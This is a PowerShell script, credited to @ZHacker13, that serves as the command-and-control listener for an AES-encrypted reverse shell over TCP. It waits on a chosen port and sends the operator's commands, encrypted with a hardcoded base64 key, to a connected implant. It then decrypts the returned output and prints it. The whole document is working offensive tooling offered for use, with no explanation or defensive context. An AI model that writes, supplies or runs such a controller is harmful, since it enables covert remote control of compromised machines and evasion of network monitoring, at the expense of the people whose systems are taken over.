
### Reverse Encrypted (AES 256-bit) Shell over TCP: C2-Server Listener. ###
### By: @ZHacker13 ###

$Port = Read-Host "`nPort";
Write-Output "[*] Listeneing on Port [`"$Port`"] [*]`n";
$Base64 = "gFeiLF2hzwuMF3oYS1IOG6+pLZbUrOJDZQo2i0igsjc=";
$Key = ([Convert]::FromBase64String($Base64));
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
Write-Output "[*] Connection [*]`n";
$Stream = $Client.GetStream();
[byte[]]$Bytes = 0..65535|%{0};

while($Client.Connected -eq $true)
{
    $Command = Read-Host "Command";
    $EnCode = ConvertTo-SecureString $Command -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;
    $SendByte = ([text.encoding]::ASCII).GetBytes($EnCode);
    $Stream.Write($SendByte,0,$SendByte.Length);
    $Stream.Flush();
    if($Command -eq "Exit")
    {
       break;
    }
    $Read = $null;
    while($Stream.DataAvailable -or $Read -eq $null)
    {
        $Read = $Stream.Read($Bytes, 0, 65535);
        $OutPut = ([text.encoding]::ASCII).GetString($Bytes, 0, $Read);
        $DeCode = $OutPut | ConvertTo-SecureString -Key $Key;
        Write-Output([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DeCode)));
    }
}

$Socket.Stop();
$Client.Close();
$Stream.Dispose();